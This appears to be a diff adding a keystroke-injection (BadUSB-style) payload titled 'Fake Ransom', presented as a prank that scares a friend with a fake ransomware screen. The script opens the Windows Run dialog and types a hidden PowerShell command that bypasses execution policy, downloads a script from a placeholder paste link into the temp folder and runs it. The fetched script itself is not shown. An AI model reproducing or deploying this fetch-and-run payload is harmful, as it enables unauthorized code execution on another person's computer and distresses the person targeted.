@@ -1,0 +1,13 @@
+REM Title: Fake Ransom
+REM Author: @DjCode
+REM Description: Uses Powershell to scare your friend ! password to exit : gandalf (yep, u shall pass this time)
+REM Target: Windows (PowerShell >= 3.0, so W11/10/8, and maybe 7)
+
+GUI r
+
+DELAY 500
+
+ALTSTRING powershell -w h -NoP -NonI -Exec Bypass iwr <Your pastRaw Link> -OutFile $env:TEMP\fake.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\fake.ps1
+
+ENTER
+
